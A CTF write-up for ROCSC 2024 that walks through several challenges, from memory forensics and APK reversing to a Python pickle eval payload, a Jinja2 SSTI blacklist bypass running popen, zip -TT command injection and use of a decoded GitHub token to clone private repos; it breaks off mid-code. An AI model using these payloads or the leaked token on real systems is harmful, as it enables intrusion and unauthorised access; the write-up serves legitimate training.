# ROCSC 2024

Victor-Andrei Moșolea - mvictorandrei@gmail.com - vektor 

## from-memory
### Flag proof
```
Q1. Provide the ip of the compromised machine: 10.0.2.15
Q2. Provide the name of the script executed by the attacker on the compromised machine to infect it: PSRansom.ps1
Q3. Provide the name of the malicious executable that was launched on the compromised system by the attacker: CashCat.exe
```
### Summary
The questions are all very specific, therefore they map well to the volatility commands we will need to use and sometimes strings and grep are more than enough.

### Details
We start off by getting the profile for the memory dump we were given.
```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/from-memory]
└─$ python2 /opt/tools/volatility/vol.py -f ro3.bin imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win10x64_19041
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/mnt/hgfs/CTF/rocsc2024/from-memory/ro3.bin)
                      PAE type : No PAE
                           DTB : 0x1aa002L
                          KDBG : 0xf8072201ab20L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff80720f71000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2024-03-07 13:39:44 UTC+0000
     Image local date and time : 2024-03-07 05:39:44 -0800
```
Now with the given profile we can answer the first question:

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/from-memory]
└─$ python2 /opt/tools/volatility/vol.py -f ro3.bin --profile=Win10x64_19041 netscan          
Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
<more output>
0xe68ecfda24b0     TCPv4    10.0.2.15:49960                132.245.230.28:443   ESTABLISHED      -1 
<more output>
```

And we can see our local address: `10.0.2.15`. For the second question, we can make use of the fact that this is a Windows image and just look for Powershell extension inside the image:

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/from-memory]
└─$ strings ro3.bin| grep \.ps1          
?.ps1
?.ps1
https://github.com/JoelGMSec/PSRansom/blob/main/PSRansom.ps1U)
/JoelGMSec/PSRansom/blob/main/PSRansom.ps1
PSRansom.ps1
https://github.com/JoelGMSec/PSRansom/blob/main/PSRansom.ps1
PSRansom.ps1Callback
https://github.com/JoelGMSec/PSRansom/blob/main/PSRansom.ps1
^C
```
Our second answer: `PSRansom.ps1`. For the third question we search for the command line for all the running processes using:
```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/from-memory]
└─$ python2 /opt/tools/volatility/vol.py -f ro3.bin --profile=Win10x64_19041 cmdline
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
System pid:      4
************************************************************************
Registry pid:     72
************************************************************************
<more output>
FileCoAuth.exe pid:   7016
Command line : "C:\Users\plant\AppData\Local\Microsoft\OneDrive\24.025.0204.0003\FileCoAuth.exe" -Embedding
************************************************************************
CashCat.exe pid:   2072
Command line : "C:\Users\plant\AppData\Local\Temp\8b46097e-9f2a-4155-bd5a-d85395b1fbc7_CashCat.zip.bc7\CashCat.exe" 
************************************************************************
<more output>
```
Looking through the processes we find `CashCat.exe` which is our third flag.

## bin-diving
### Flag proof
```CTF{7ec872e2eac614d2ee8f6055207d51c5603df6ca2df9f6207d72f91b1e9ec28a}```
### Summary
Pickle RCE. We must use it to find a deleted object that is still referenced and contains the flag as a field.

### Details
In order to get all objects that are in memory in Python we can use gc.get_objects(). We can print the output for this function call and try to locate our instance of the class with the flag. In order to do this we create a script which will prepare our payload in the way the chall expects to read it.

```python
import pickle
import base64


class PickleRce(object):
    def __reduce__(self):
        payload = """print(__import__("gc").get_objects())"""
        return (eval, (payload,))


print (base64.b64encode(pickle.dumps(PickleRce())))
```

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/bin-diving]
└─$ python3 solve.py      
b'gANjYnVpbHRpbnMKZXZhbApxAFglAAAAcHJpbnQoX19pbXBvcnRfXygiZ2MiKS5nZXRfb2JqZWN0cygpKXEBhXECUnEDLg=='
                                                                                                                                      
┌──(kali㉿kali)-[~/CTF/rocsc2024/bin-diving]
└─$ nc 34.89.210.219 31240
What do you want to do?
I want to gANjYnVpbHRpbnMKZXZhbApxAFglAAAAcHJpbnQoX19pbXBvcnRfXygiZ2MiKS5nZXRfb2JqZWN0cygpKXEBhXECUnEDLg==
What do you want to do?
I want to [(<cell at 0x7fbadaa63a90: __Wm2Cod__ object at 0x7fbad9d8a430>,), <function prepare.<locals>.keep_alive at 0x7fbad9d8f880>, (__Wm2Cod__(flag='\n=== Alert ===\nMessage from admin:\n\nLOL, you really thought this i
<more output>
```

When sent, a lot is printed, but we can see a list, containing tuples where each tuple has as its first element a cell that wraps the actual object. We can see that the first element from this list is a cell of a class with double underscores at the beginning and end, just like our secret class. Let’s try to extract the flag from it.

```python
import pickle
import base64


class PickleRce(object):
    def __reduce__(self):
        payload = """print(getattr(__import__("gc").get_objects()[0][0].cell_contents,"flag"))"""
        return (eval, (payload,))


print (base64.b64encode(pickle.dumps(PickleRce())))
```

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/bin-diving]
└─$ python3 solve.py      
b'gANjYnVpbHRpbnMKZXZhbApxAFhJAAAAcHJpbnQoZ2V0YXR0cihfX2ltcG9ydF9fKCJnYyIpLmdldF9vYmplY3RzKClbMF1bMF0uY2VsbF9jb250ZW50cywiZmxhZyIpKXEBhXECUnEDLg=='
```

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/bin-diving]
└─$ nc 34.89.210.219 31240
What do you want to do?
I want to gANjYnVpbHRpbnMKZXZhbApxAFhJAAAAcHJpbnQoZ2V0YXR0cihfX2ltcG9ydF9fKCJnYyIpLmdldF9vYmplY3RzKClbMF1bMF0uY2VsbF9jb250ZW50cywiZmxhZyIpKXEBhXECUnEDLg==
What do you want to do?
I want to CTF{7ec872e2eac614d2ee8f6055207d51c5603df6ca2df9f6207d72f91b1e9ec28a}

[1] You said None
```

## friendly-colabs
### Flag proof
```CTF{d0eba2a6600812a51a3d0a00ed43aef619574358ec62d20506daf92baf1d83ce}```
### Summary
Look through the repos available on the profile and find one that contains another contributor, who happens to have a different version of the same repo. Looking through the commits we find a github token which we can use to clone the original repo. Looking through it’s branch graph we find two parts of the flag and a link to another repo which using the same method gives us the missing part.

### Details
![image](https://github.com/vektor8/CTF-Writeups/assets/56222237/4cff6c34-5649-4c7d-b9c3-6f029030c329)

So the provided link goes nowhere. But the profile does have one visible [repository](https://github.com/b3taflash/test-version), where we can look at the commits and see that there is one other profile contributing: danielpopovici16

![a48ea8c8-5072-4432-9bb2-d7bbccc5db99](https://github.com/vektor8/CTF-Writeups/assets/56222237/acf33187-5af1-4c20-858a-04d3b3bccbeb)

We go to his profile where we find a commit named doubled-private with the content:

![47162f6b-22b4-42fb-892e-6e63f5a77dd6](https://github.com/vektor8/CTF-Writeups/assets/56222237/cb8248ad-3f2a-443c-a0b6-383983c8d05b)

We decode the access token using base64 twice:

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/friendly-colabs]
└─$ echo "WjJod1gxQmFORFpHUTNGNWFERldZMnR4VjJ0RlRuUlFkbVZFV0RKMVZtSk1WVEJ3UW1obFp3PT0=" | base64 -d
Z2hwX1BaNDZGQ3F5aDFWY2txV2tFTnRQdmVEWDJ1VmJMVTBwQmhlZw==                                                                                                                                      
┌──(kali㉿kali)-[~/CTF/rocsc2024/friendly-colabs]
└─$ echo "WjJod1gxQmFORFpHUTNGNWFERldZMnR4VjJ0RlRuUlFkbVZFV0RKMVZtSk1WVEJ3UW1obFp3PT0=" | base64 -d | base64 -d
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
```

Using that access token we clone the original repo(the one given in the description):

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/friendly-colabs]
└─$ git clone https://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@github.com/b3taflash/friendly-colabs
Cloning into 'friendly-colabs'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 12 (delta 1), reused 9 (delta 1), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (1/1), done.
```
And we start our search. To make this easier we can use a VSCode extension to see the git branch graph.

In one of the commits the author is the first part of the flag:

![114152fe-ef3d-4369-afff-c2c1daa792b2](https://github.com/vektor8/CTF-Writeups/assets/56222237/e1b2256c-3148-4f0c-817b-8b759700e1c8)

And in another there is change to the Dockerfile which contains the second part of the flag

![1a8e95b1-0930-4c6b-909f-53bac2b567bf](https://github.com/vektor8/CTF-Writeups/assets/56222237/340748d1-7f54-41d6-91a3-73a3c9d4a4e5)

There is also a commit with a thank you message referencing another repo, we use the same token to clone that one as well.

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/friendly-colabs]
└─$ git clone https://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@github.com/danielpopovici16/secret.git
Cloning into 'secret'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 6 (delta 0), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (6/6), done
```

We do the same with this repo and look through it’s commits with vscode and we find our third and final part of the flag

![7ad49697-b293-4384-985d-d0a1e38558ff](https://github.com/vektor8/CTF-Writeups/assets/56222237/73c1b7a1-5603-4c1e-9b82-df61dd3b0549)

## joker-and-batman-story
### Flag proof
```ctf{b4AtM4n_l0v3s_j0K3r_w1Th0uT_Pr3jUd1C3}```
### Summary
Given the capture of the WPA handshake, crack it using the wordlist generated using the given hint. Open the capture in Wireshark again and and use the given Wi-Fi password to decrypt the traffic. Export all HTTP objects and find the letter and the photo with the bat. Use stegcrack to try all words from the letter and get the flag.
### Details
When opened in wireshark the given capture file does not contain anything of help.

![84fe79a6-ffb1-407a-8926-a737b607d1d5](https://github.com/vektor8/CTF-Writeups/assets/56222237/1708a9ce-8eb3-47c2-8d69-e7fa2cf76b92)


However we can see that it contains connection packets to SSID=`Batman`
To extract the hash to crack we can do the following:
```bash
──(kali㉿kali)-[~/CTF/rocsc2024/joker-and-batman-story]
└─$ hcxpcapngtool joker_hack-01\ \(custom\ batman\ story\).cap -o crackme
```

We generate the wordlist just like the hint told us:

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/joker-and-batman-story]
└─$ cat /usr/share/wordlists/rockyou.txt | grep Joker > crack.txt
```
And we get to cracking:
```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/joker-and-batman-story]
└─$ hashcat -m 22000 crackme crack.txt       
hashcat (v6.2.6) starting
<more output>
eb8d1bc24d4d7e4175575c28487bf618:28ee523f565b:00bb608b8891:Batman:Joker4life
```

With the newfound password we import it into wireshark:

![13beb541-08f7-4c37-bb25-2dd5f5d3e6bc](https://github.com/vektor8/CTF-Writeups/assets/56222237/f2c55df8-30b9-4782-b0a3-858f294c33d9)

Now in the decrypted traffic we can see HTTP requests and responses:

![f252683d-4edd-4737-a9b7-4c2e2e6d15f6](https://github.com/vektor8/CTF-Writeups/assets/56222237/f0819a5a-24d1-47cb-8892-c9f50e7aa42d)

We export the objects from wireshark and start looking.

In the exported objects we find the letter and the bat picture 

![87034ff6-0509-434a-8ba7-6e37ce47baa4](https://github.com/vektor8/CTF-Writeups/assets/56222237/83807b68-006c-4ab8-8ec8-e45a7eb2f1a2)

We are given a second hint about how we need a word from the letter so we write a small script to extract all words:

```python
text = open("http_objects/%5c").read()

for i in text.split():
    print(i.strip())
```

```bash
(venv) ┌──(venv)─(kali㉿kali)-[~/CTF/rocsc2024/joker-and-batman-story]
└─$ python3 gen_wordlist.py > word.txt
                                                                                                                                      
(venv) ┌──(venv)─(kali㉿kali)-[~/CTF/rocsc2024/joker-and-batman-story]
└─$ stegcracker http_objects/object1503.image.jpeg  word.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2024 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'http_objects/object1503.image.jpeg' with wordlist 'word.txt'..
Successfully cracked file with password: Harlequinof
Tried 79 passwords
Your file has been written to: http_objects/object1503.image.jpeg.out
Harlequino
```

![9a5f0067-d5a9-41d9-afdd-5e88ff2e8d62](https://github.com/vektor8/CTF-Writeups/assets/56222237/93fcd76a-6b08-4a34-9925-54ee4d2ebb1e)

## rtfm

### Flag proof
```CTF{baf0c514219ab318bc663c815a4f2b69e6b5767b398f07eebcc5b235b194f9be}```
### Summary
Command injection using zip but we are limited to using only one parameter.
### Details
We are told to read the manual both in the name and description in the flag so the natural thing to do is to ask for help:

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ nc 34.89.210.219 30384             
Zip me: -h
Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
Zip 3.0 (July 5th 2008). Usage:
zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]
```

So it runs zip, but with what parameters, we can find that out with the -sc option

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ nc 34.89.210.219 30384
Zip me: -sc
command line:
'zip'  '-sc'  'test.zip'  'test_file'  

zip error: Interrupted (show command line)
```

Reading the manual we find an option -TT which allows the user to tell a command to be used instead of unzip when testing the zip integrity with the -T (--test) option. We are limited to specifying everything in one argument. We can specify two options in the same argument like here where we both test and activate debug output.

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ nc 34.89.210.219 30384
Zip me: -Tsd
sd: Zipfile name 'test.zip'
sd: Command line read
sd: Reading archive
sd: Scanning files
sd: Applying filters
sd: Checking dups
sd: Scanning files to update
sd: fcount = 0
sd: Open zip file and create temp file
sd: Creating new zip file
sd: Going through old zip file
updating: test_file (stored 0%)
sd: Zipping up new entries
sd: Get comment if any
sd: Writing central directory
sd: Writing end of central directory
test of test.zip OK
sd: Replacing old zip file
sd: Setting file type
```

Naturally we try -TTTls, which should test and use ls instead of unzip. But it doesn’t work because -TTT is confusing, we just need to place another valid argument between.

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ nc 34.89.210.219 30384
Zip me: -TsdTTls
sd: Zipfile name 'test.zip'
sd: Command line read
sd: Reading archive
sd: Scanning files
sd: Applying filters
sd: Checking dups
sd: Scanning files to update
sd: fcount = 0
sd: Open zip file and create temp file
sd: Creating new zip file
sd: Going through old zip file
updating: test_file (stored 0%)
sd: Zipping up new entries
sd: Get comment if any
sd: Writing central directory
sd: Writing end of central directory
ziUMa6UF
test of test.zip OK
sd: Replacing old zip file
sd: Setting file type
```

And it works great, printing the name of the temporary archive generated by the zip program.
We need to somehow print the archive, for that we have base64, but before we do that let’s just add the flag.txt file to the archive.

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ nc 34.89.210.219 30384
Zip me: flag.txt
updating: test_file (stored 0%)
  adding: flag.txt (deflated 7%)
```

```bash
Now we can retrieve our archive like this.
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ nc 34.89.210.219 30384                                                                           
Zip me: -TsdTTbase64
sd: Zipfile name 'test.zip'
sd: Command line read
sd: Reading archive
sd: Scanning files
sd: Applying filters
sd: Checking dups
sd: Scanning files to update
sd: fcount = 0
sd: Open zip file and create temp file
sd: Creating new zip file
sd: Going through old zip file
updating: test_file (stored 0%)
sd: Zipping up new entries
sd: Get comment if any
sd: Writing central directory
sd: Writing end of central directory
UEsDBAoAAAAAAGJFZlgAAAAAAAAAAAAAAAAJABwAdGVzdF9maWxlVVQJAAOXLOhllyzoZXV4CwAB
BAAAAAAE6AMAAFBLAwQUAAAACABgRWZYNA2cP1MAAABZAAAACAAcAGZsYWcudHh0VVQJAAOTLOhl
kyzoZXV4CwABBAAAAAAE6AMAAAXBwQ2AIAwF0DvTWKCFnk2YwMQj6W9ATYwLGHf3vXbb0dfTrud6
jt62PYR1ay9sLs6UI6khUYWLJK/ElmeE6BBwkYKkdS5lDLgzYmKQ5qkYX/gBUEsBAh4DCgAAAAAA
YkVmWAAAAAAAAAAAAAAAAAkAGAAAAAAAAAAAAOiBAAAAAHRlc3RfZmlsZVVUBQADlyzoZXV4CwAB
BAAAAAAE6AMAAFBLAQIeAxQAAAAIAGBFZlg0DZw/UwAAAFkAAAAIABgAAAAAAAEAAADogUMAAABm
bGFnLnR4dFVUBQADkyzoZXV4CwABBAAAAAAE6AMAAFBLBQYAAAAAAgACAJ0AAADYAAAAAAA=
test of test.zip OK
sd: Replacing old zip file
sd: Setting file type
```

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ echo "UEsDBAoAAAAAAGJFZlgAAAAAAAAAAAAAAAAJABwAdGVzdF9maWxlVVQJAAOXLOhllyzoZXV4CwABBAAAAAAE6AMAAFBLAwQUAAAACABgRWZYNA2cP1MAAABZAAAACAAcAGZsYWcudHh0VVQJAAOTLOhlkyzoZXV4CwABBAAAAAAE6AMAAAXBwQ2AIAwF0DvTWKCFnk2YwMQj6W9ATYwLGHf3vXbb0dfTrud6jt62PYR1ay9sLs6UI6khUYWLJK/ElmeE6BBwkYKkdS5lDLgzYmKQ5qkYX/gBUEsBAh4DCgAAAAAAYkVmWAAAAAAAAAAAAAAAAAkAGAAAAAAAAAAAAOiBAAAAAHRlc3RfZmlsZVVUBQADlyzoZXV4CwABBAAAAAAE6AMAAFBLAQIeAxQAAAAIAGBFZlg0DZw/UwAAAFkAAAAIABgAAAAAAAEAAADogUMAAABmbGFnLnR4dFVUBQADkyzoZXV4CwABBAAAAAAE6AMAAFBLBQYAAAAAAgACAJ0AAADYAAAAAAA=" | base64 -d > flag.zip
                                                                                                                                      
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ unzip flag.zip 
Archive:  flag.zip
 extracting: test_file               
  inflating: flag.txt                
                                                                                                                                      
┌──(kali㉿kali)-[~/CTF/rocsc2024/rtfm]
└─$ cat flag.txt 
Flag_Chaining_FTW

CTF{baf0c514219ab318bc663c815a4f2b69e6b5767b398f07eebcc5b235b194f9be}
```
And there it is, the archive and inside it, the flag.

## android-echoes
### Flag proof
```696de3c42f0e9c25efc0ce4937d31f51e4bc657fc2fcde58cfe045b92bd1```
### Summary
Reverse engineer the apk to find a broadcast receiver which if the date is 15-03-2024 computes the flag and shows it.

### Details
I wasted plenty of time trying to run the apk in an emulator and send it a broadcast receiver using adb. Thankfully it was no need for that.

Using jadx-gui we can see the an interesting class:

```java
package com.vulnerableapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.util.Base64;
import android.widget.Toast;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.Metadata;
import kotlin.collections.CollectionsKt;
import kotlin.collections.IntIterator;
import kotlin.jvm.internal.Intrinsics;
import kotlin.ranges.IntRange;
import kotlin.text.Charsets;

/* compiled from: VulnerableBroadcastReceiver.kt */
@Metadata(d1 = {"\u00004\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010 \n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u0004H\u0002J\u000e\u0010\u0006\u001a\b\u0012\u0004\u0012\u00020\u00040\u0007H\u0002J\u0010\u0010\b\u001a\u00020\u00042\u0006\u0010\t\u001a\u00020\nH\u0002J\u001c\u0010\u000b\u001a\u00020\f2\b\u0010\r\u001a\u0004\u0018\u00010\u000e2\b\u0010\u000f\u001a\u0004\u0018\u00010\u0010H\u0016¨\u0006\u0011"}, d2 = {"Lcom/vulnerableapplication/VulnerableBroadcastReceiver;", "Landroid/content/BroadcastReceiver;", "()V", "decodeBase64", "", "input", "generateObfuscatedResourceNames", "", "generateRandomStringForPart", "part", "", "onReceive", "", "context", "Landroid/content/Context;", "intent", "Landroid/content/Intent;", "app_release"}, k = 1, mv = {1, 9, 0}, xi = 48)
/* loaded from: classes.dex */
public final class VulnerableBroadcastReceiver extends BroadcastReceiver {
    public static final int $stable = 0;

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String str;
        String string;
        if (Intrinsics.areEqual(new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date()), "2024-03-15")) {
            Resources resources = context != null ? context.getResources() : null;
            ArrayList arrayList = new ArrayList();
            for (String str2 : generateObfuscatedResourceNames()) {
                Integer valueOf = resources != null ? Integer.valueOf(resources.getIdentifier(str2, "string", context.getPackageName())) : null;
                if (valueOf == null || (string = resources.getString(valueOf.intValue())) == null) {
                    str = null;
                } else {
                    Intrinsics.checkNotNull(string);
                    str = decodeBase64(string);
                }
                if (str != null) {
                    arrayList.add(str);
                }
            }
            Toast.makeText(context, "This is the secret: " + CollectionsKt.joinToString$default(arrayList, "", null, null, 0, null, null, 62, null), 1).show();
            return;
        }
        Toast.makeText(context, "Try harder", 1).show();
    }

    private final List<String> generateObfuscatedResourceNames() {
        IntRange intRange = new IntRange(1, 10);
        ArrayList arrayList = new ArrayList(CollectionsKt.collectionSizeOrDefault(intRange, 10));
        Iterator<Integer> it = intRange.iterator();
        while (it.hasNext()) {
            arrayList.add("obf_" + generateRandomStringForPart(((IntIterator) it).nextInt()));
        }
        return arrayList;
    }

    private final String generateRandomStringForPart(int i) {
        return (String) CollectionsKt.listOf((Object[]) new String[]{"a1b2c", "d3e4f", "g5h6i", "j7k8l", "m9n0o", "p1q2r", "s3t4u", "v5w6x", "y7z8a", "b9c0d"}).get(i - 1);
    }

    private final String decodeBase64(String str) {
        byte[] decode = Base64.decode(str, 0);
        Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");
        return new String(decode, Charsets.UTF_8);
    }
}
```

Essentially the onReceive function checks for the local date and if different of 2024-03-15 displays “Try harder” message, otherwise the flag. The flag is generated by fetchings strings from resources, resource names which are built using generatedObfuscatedResourceNames function which in turn calls the generateRandomStringForPart which just returns an element from a static list depending on the requested element. Therefore the resource names become: obf_a1b2c, obf_d3e4f etc. The values for the names can be found in the res/values/strings.xml file contained inside the apk. After fetching this value from the resources, base64 decode is applied to it and concatenated to the result.

With all of this said, we can write a script implementing the same logic

```python
import base64
arr = ["a1b2c", "d3e4f", "g5h6i", "j7k8l", "m9n0o", "p1q2r", "s3t4u", "v5w6x", "y7z8a", "b9c0d"]


mapping = {
"obf_a1b2c": "Njk2ZGUz",
"obf_b9c0d": "YjkyYmQx",
"obf_d3e4f": "YzQyZjBl",
"obf_g5h6i": "OWMyNWVm",
"obf_j7k8l": "YzBjZTQ5",
"obf_m9n0o": "MzdkMzFm",
"obf_p1q2r": "NTFlNGJj",
"obf_s3t4u": "NjU3ZmMy",
"obf_v5w6x": "ZmNkZTU4",
"obf_y7z8a": "Y2ZlMDQ1",
}
res_names = map(lambda i: "obf_" + i, arr)


l = []
for i in res_names:
    a = base64.b64decode(mapping[i])
    l.append(a)


res = b"".join(l)
print(res.decode())
```
Running it gives us our flag:

```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/android-echoes]
└─$ python3 solve.py
696de3c42f0e9c25efc0ce4937d31f51e4bc657fc2fcde58cfe045b92bd1
```

## grocery-list
### Flag proof
```CTF{5fd924625f6ab16a19cc9807c7c506ae1813490e4ba675f843d5a10e0baacdb8}```
### Summary
SSTI with blacklist, concat strings to bypass the blacklist.

### Details
Looking through the network tab we notice that the Server Header is set to “Server: Werkzeug/3.0.1 Python/3.10.12” meaning we have a Python web app. This makes us think that it must use a templating engine, so we try the classic {{7*7}} everywhere we can and find that it works here: 

![d32d1b25-2111-4ad3-a253-4a5dc52447cf](https://github.com/vektor8/CTF-Writeups/assets/56222237/a995de35-0fb9-49a1-a36a-2428970b0b44)


On payload all the things we find a fitting payload: 


![c71d614e-6e1f-4aab-870b-16ee4ac96c11](https://github.com/vektor8/CTF-Writeups/assets/56222237/5fa81bd2-a3c0-4163-866a-1c4fab7a72a4)

In order to bypass the filter we can just concatenate strings instead of outright using them like so:

```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}``` (which we just copied from the payload all the things repo) becomes ```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fb' +'uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi' + 'mport\x5f\x5f')('o' + 's')|attr('p' + 'open')('id')|attr('read')()}}```

Which works great:

![06507505-4398-4b98-adff-62ab15319f9f](https://github.com/vektor8/CTF-Writeups/assets/56222237/de6ae5a4-be04-48d2-a62f-25d803aa354c)

Now let’s update the payload to read the flag.

```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fb' +'uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi' + 'mport\x5f\x5f')('o' + 's')|attr('p' + 'open')('cat f' + 'lag\x2etxt')|attr('read')()}}```

We use \x2e instead of . (dot) because dot is not allowed and there we go, our flag

![b1e602d4-7481-416d-9833-df1527fd6386](https://github.com/vektor8/CTF-Writeups/assets/56222237/a08b8714-1aa7-40cb-bd5d-03d1f7772f63)

## binary-illusions
### Flag proof
```
Q1. What technique does the malware use?: dll-hijacking
Q2. What is the query that the malware is trying to execute? : SELECT * FROM Win32_OperatingSystem
Q3. Provide the final flag : CTF{m4st3r-0F-r3ver7e}
```
### Details
For the first question I just tried a few answers and landed on dll-hijacking which made the most sense due to the given files.
For the second question it was enough just to:
```bash
┌──(kali㉿kali)-[~/CTF/rocsc2024/binary-illusions]
└─$ strings binary-illusions.exe | grep SELECT
SELECT * FROM Win32_OperatingSystem
```
But for the third flag we had to finally jump into ghidra. First let’s see what our program does when ran 

![939a7ff9-169f-4301-bba7-b676293c2c41](https://github.com/vektor8/CTF-Writeups/assets/56222237/6a14627b-9b29-43a9-8554-e32d0f698cd0)

It shows this string which is nowhere to be found in the main exe, since it is in the DLL. Not only that, it is not actually called. It is the entry point of the dll which is called when loaded, therefore the following behaves the same

![d5f6d988-0590-458a-bcc5-d7ff590cd295](https://github.com/vektor8/CTF-Writeups/assets/56222237/dae65966-c29d-408b-a408-3ea5b1f3fdf7)

One of the strings present in the dll is “Maybe here is your flag” so we look for it in ghidra and find it in the following function. Here is also where we find the characters of the flag used one by one:

![c2577b33-69e2-4dcc-8ddf-2f4372cfd879](https://github.com/vektor8/CTF-Writeups/assets/56222237/20416662-a766-4d80-908d-0297f8fb0326)

Starting with ‘{‘ we just copy each one of the chars used in the calls to the CALL_TO_FLAG_CHAR as I renamed it and we get our flag: {m4st3r-0F-r3ver7e}
To which we add the CTF part.

## special-waffle
### Flag proof
```
Q1. Provide the IP of the compromised machine?: 172.16.1.219
Q2. Provide the domain used by the attacker for C2 : test.dirigu.ro
Q3. Provide the name of the malicious file that was downloaded on the compromised machine. : documents.zip
Q4. Provide the name of the ransomware used în the attack : waffle
```
### Summary
Analyze kibana logs and answer the questions
### Details
We open up the logs and start looking for the answers. For the first question it is enough to look at the values for the source_ip to see a local address with more than half the traffic which proves to be our answer.

![d4c44e84-83c7-4f79-b7d6-30b1f38de621](https://github.com/vektor8/CTF-Writeups/assets/56222237/d5633adf-f20a-461e-9f77-cf320c8945b8)

With this in mind we filter for traffic to and from this address and we look for HTTP hoping that we can see some plaintext traffic there.

![c1b9bd59-654f-4cca-81a3-e3f5e2b16bad](https://github.com/vektor8/CTF-Writeups/assets/56222237/36cbbf18-6a1d-4f53-8386-1c8ae7b57dbf)

Which works great and gives up the domain of our C2: `test.dirigu.ro`. We restrict the previous filter such that the target (172.16.1.219) is just in the source since we expect some file download leading to the infection. With this, we find an HTTP get request made by the victim to the business-z.ml host and our file name in the request: `documents.zip`

![70307640-a326-4e4b-9f8c-6f1267a0505c](https://github.com/vektor8/CTF-Writeups/assets/56222237/a57dbd2a-4601-4b8d-8c58-bdada1efc61e)

For the final question, we look back at the traffic to the C2 and try to look up some of the strings we see in the POST requests, such as: `dXf4cS4GPL`. With the help of google and the previous string we reach this [article](https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike) about the squirrelwaffle malware. So we try squirrelwaffle as our flag then we just try `waffl`e and there it was, our flag.

## cool-upload
### Flag proof
```CTF{f7a7e2c537476176b0763263c6ff9c89c6d111c43955f876f61c866dcbff6361}```
### Summary
Upload js files bypassing the js filters implemented in the app. Then use the /report endpoint to access the /custom endpoint where we can embed our uploaded file to be included in the resulting page. Essentially we are forcing the puppeteer browser instance to force and execute our code contained in the file uploaded initially allowing us to leak the flag.
### Details
We unzip the challenge and get to reading the code. We see that when we upload a file, this function (acting like a middleware) is called.

```js
const storage = multer.diskStorage({
  destination: function(req, file, cb) {
    cb(null, 'public/uploads');
  },
  filename: function(req, file, cb) {
    if (!isNotJsExtension(file.originalname)) {
      cb(new Error('JavaScript files are not allowed'), false);
    } else {
      // Avoid duplicate files
      cb(null, 'local' + '-' + file.originalname);
    }
  }
});
```

In turn this function uses this one to check for js files.
```js
function isNotJsExtension(filePath) {
  const extension = path.extname(filePath);
